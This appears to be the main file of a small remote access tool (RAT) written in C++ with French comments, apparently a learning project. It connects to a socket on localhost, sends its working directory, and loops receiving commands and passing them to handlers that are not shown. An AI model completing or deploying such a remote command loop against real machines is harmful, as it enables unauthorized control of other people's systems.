/*********************************************************************
RATServer.cpp - Programme server se connectant au RAT
écrit par: Pierre-Marc Laforest
Date: 2017-03-24
**********************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <string.h>
#include <unistd.h>
//#include  <direct.h>
#include "comClientServer.h"
#include "RATFonctions.h"

//#define ADRESSE_IP "172.16.13.35"
#define ADRESSE_IP "localhost"
#define PORT_NUMB 1030

#define COMMANDE_MAX_CHARS 1000
#define ARGUMENTS_MAX_CHARS 1000
#define CHEMIN_DOSSIER_MAX 2000

using namespace std;

// Current working directory (cwd)
char rootDirectory[1024];

int main(int argc, char **argv)
{
  //WORD wVersionRequested = MAKEWORD(1, 1);
  //WSADATA wsaData;
  SOCKET remoteSocketServer;
  int nRet;
  //short nPort;
  char ip_address_str[] = "localhost";
	
  char commandeBuf[COMMANDE_MAX_CHARS];
  char argumentsBuf[ARGUMENTS_MAX_CHARS];

  // Check for the host and port arguments
  if (argc != 1)
    {
      cout << "\nSyntax: RATServer.exe";
      cout << endl;
      return -1;
    }
	
  // Initialize WinSock and check the version
  /*
    nRet = WSAStartup(wVersionRequested, &wsaData);
    if (wsaData.wVersion != wVersionRequested)
    {
    cout << "Wrong version";
    return;
    }
  */

  RATServer_initComAvecClient(ip_address_str, PORT_NUMB, &remoteSocketServer);

  // Envoi du dossier courant
  memset(rootDirectory, 0, 1024);
  getcwd(rootDirectory, 1024);
  nRet = envoiStrParSocket(rootDirectory, remoteSocketServer);
  if (nRet == -1)
    {
      return -1;
    }
    
  do 
    { 
      RATServer_receptionCommandes(commandeBuf, sizeof(commandeBuf), argumentsBuf, remoteSocketServer);
      nRet = RATServer_traiteCommandes(commandeBuf, argumentsBuf, remoteSocketServer);
    } while (nRet != -1);

  fermerCom(&remoteSocketServer);
  terminerCom();
  //WSACleanup();
  return 0;
}


